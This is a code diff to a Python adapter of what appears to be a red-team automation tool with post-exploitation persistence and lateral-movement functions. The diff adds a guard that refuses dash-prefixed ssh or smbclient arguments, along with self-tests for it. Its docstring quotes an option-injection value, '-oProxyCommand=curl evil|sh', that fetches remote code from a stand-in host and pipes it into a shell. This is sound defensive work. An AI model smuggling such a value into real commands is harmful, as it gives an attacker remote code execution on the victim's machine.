@@ -2316,6 +2316,27 @@ def _postex_persistence_install(self: LinuxAdapter, verb: Verb, action: Action) 
     return rec
 
 
+def _reject_option_injection(*values: str) -> None:
+    """Refuse argv values that a downstream tool would read as an *option*.
+
+    The no-shell design (argv lists, never a command string) removes command
+    injection outright, but it does not stop *option* injection: a model-supplied
+    positional like ``as_user='-oProxyCommand=curl evil|sh'`` is a single argv
+    entry, yet ``ssh`` (and ``smbclient``) parse any argv element beginning with
+    ``-`` as an option rather than a destination. These values are destinations
+    and usernames, for which a leading dash is never legitimate, so we refuse
+    rather than pass it through. This is the one residual injection class the
+    argv-list rule does not close by itself, so it is closed here explicitly.
+    """
+    for v in values:
+        if v.startswith("-"):
+            raise AdapterError(
+                f"refusing argument {v!r}: a value beginning with '-' would be "
+                "interpreted as a command-line option by the remote-access tool "
+                "(option injection). Destinations and usernames must not start "
+                "with a dash.")
+
+
 def interpret_ssh_result(returncode: int, stderr: str) -> dict[str, Any]:
     """Classify a non-interactive ``ssh -o BatchMode=yes`` attempt.
 
@@ -2341,6 +2362,8 @@ def _postex_lateral_move(self: LinuxAdapter, verb: Verb, action: Action) -> Obse
     method = action.params["method"]
     as_user = action.params["as_user"]
     target = action.target or ""
+    # Close option-injection before any of these values reaches ssh/smbclient argv.
+    _reject_option_injection(target, as_user)
     if method in {"winrm", "rdp"}:
         return self._unsupported(
             action, f"{method} is not a native Linux client capability; lateral "
@@ -2926,6 +2949,20 @@ def _run_self_tests() -> int:  # noqa: C901 — a test runner is allowed to be l
     check("ssh.denied_reached", denied["reached"] is True and denied["authenticated"] is False, denied)
     refused = interpret_ssh_result(255, "ssh: connect to host x port 22: Connection refused")
     check("ssh.refused", refused["reached"] is False, refused)
+
+    # option-injection guard: a leading-dash destination/user must be refused.
+    _guard_raised = False
+    try:
+        _reject_option_injection("-oProxyCommand=evil", "root")
+    except AdapterError:
+        _guard_raised = True
+    check("optinject.refuses_dash", _guard_raised is True)
+    _guard_ok = True
+    try:
+        _reject_option_injection("192.168.1.5", "kali")
+    except AdapterError:
+        _guard_ok = False
+    check("optinject.allows_normal", _guard_ok is True)
 
     # ---- red-verb mechanisms against a throwaway SANDBOX only ----
     with tempfile.TemporaryDirectory(prefix="whetstone-selftest-") as sb:
